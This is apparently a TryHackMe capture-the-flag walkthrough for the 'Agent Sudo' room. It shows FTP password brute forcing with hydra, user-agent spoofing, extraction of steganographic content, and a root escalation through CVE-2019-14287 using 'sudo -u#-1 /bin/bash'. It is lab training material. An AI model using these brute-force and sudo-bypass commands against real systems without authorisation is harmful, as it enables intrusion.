# 🕵️ Agent Sudo CTF Walkthrough  
*TryHackMe Room: Agent Sudo*  
*Difficulty: Easy*  
*Date: 2025-07-19*  
[🔗 Room Link](https://tryhackme.com/room/agentsudoctf)

---

## 🎯 Objective  
Gain access and capture the **user** and **root** flags.

---

## 🛠️ Enumeration

### 🔍 Nmap Scan

```

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

````

---

## 🌐 Web Recon

1. Homepage mentions:  
   > *"Use your own codename as user-agent..."*

2. Tried user-agent brute force:
   ```bash
   for letter in {A..Z}; do
     curl -s -A "Agent $letter" http://sudo.thm | grep -i codename
   done
````

3. Nothing useful found → tried dir brute force with correct user-agent:

   ```bash
   gobuster dir -u http://sudo.thm -w /usr/share/wordlists/dirb/common.txt -a "Agent Sudo"
   ```

→ Found: `/index.php` but no dynamic behavior. Moved on to FTP.

---

## 📂 FTP Brute-Force

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://sudo.thm
```

→ **Found credentials (redacted)**

```bash
ftp sudo.thm
# Login: <REDACTED> / <REDACTED>
```

Downloaded files:

* `To_agentJ.txt`
* `cute-alien.jpg`
* `cutie.png`

---

## 🕵️ File Analysis & Stego

### 📜 `To_agentJ.txt`

> Mentions a password hidden inside the image.

---

### 🧩 PNG → Hidden ZIP

```bash
binwalk cutie.png
tail -c +34563 cutie.png > secret.zip
unzip -P <REDACTED> secret.zip
# Extracts: To_agentR.txt
```

---

### 🖼️ JPG Stego

```bash
steghide extract -sf cute-alien.jpg
# Passphrase: <REDACTED>
# Output: message.txt
```

---

## 🔐 SSH Access

```bash
ssh <REDACTED>@sudo.thm
# Password: <REDACTED>
```

✅ Retrieved **user flag**: `<REDACTED>`

---

## 🚀 Privilege Escalation

```bash
sudo -l
# (ALL, !root) /bin/bash
```

→ Exploit **CVE‑2019‑14287**:

```bash
sudo -u#-1 /bin/bash
whoami  # → root
cat /root/root.txt  # <REDACTED>
```

---

## 🛡️ Vulnerability Used

**CVE-2019-14287**

> A sudo misconfiguration allowing `sudo -u#-1` to execute as root even when explicitly denied.

---

## 📚 Key Takeaways

* Brute-force and user-agent spoofing can reveal hidden content.
* Basic steganography (binwalk, steghide) is still highly relevant.
* Misconfigured `sudo` permissions + known CVEs = easy root.
* Always examine available files and images for hidden data.

---

## 🏷️ Tags

`tryhackme` `ctf` `AgentSudo` `ftp` `steganography` `privesc` `sudo` `CVE-2019-14287`


